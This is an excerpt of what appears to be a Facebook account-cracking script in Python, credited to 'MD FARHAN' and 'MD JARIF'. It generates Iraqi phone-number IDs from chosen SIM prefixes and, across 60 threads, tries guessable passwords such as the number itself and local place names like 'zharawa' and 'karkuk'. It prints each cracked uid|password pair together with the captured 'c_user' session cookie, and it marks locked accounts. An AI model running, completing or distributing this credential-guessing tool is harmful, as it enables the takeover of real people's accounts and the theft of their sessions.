...
\033[1;36m███      ██ ██   ██ ██ ███████ ██   ██ ██   ██ ██   ██ ██\033[1;36m    
\033[1;36m═════════════════════════════════════════════════════════════
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MD FARHAN
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MD JARIF
...
def v2():
    ...
    os.system('clear')
    print(logo)
    print(f'\033[1;36m=[~]= SIM CODE : 750,751,770,772 ')
    kode = input(f'\033[1;36m=[~\033[1;36m\033[1;36m]= CHOOSE CODE (+964) BEST : ')
    ...
    with ThreadPool(max_workers=60) as akash:
        ...
        print(f'\033[1;36m =[~]= \033[1;36mUSE IRAQ APN FOR GOOD RESULT')
        print(linex)
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'zharawa','zharawa123','qaladza','qaladza123','750','751','ranya','slimanyah','sangasar','chamchamal','karkuk']
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;36m=[%MR,VEAR\033[1;36m]=\033[1;34m∆\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m∆\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
           ...
           'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m=[MR,VEAR-OK💚]= {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m=[MR,VEASR-LK💔]= {uid}|{ps}")
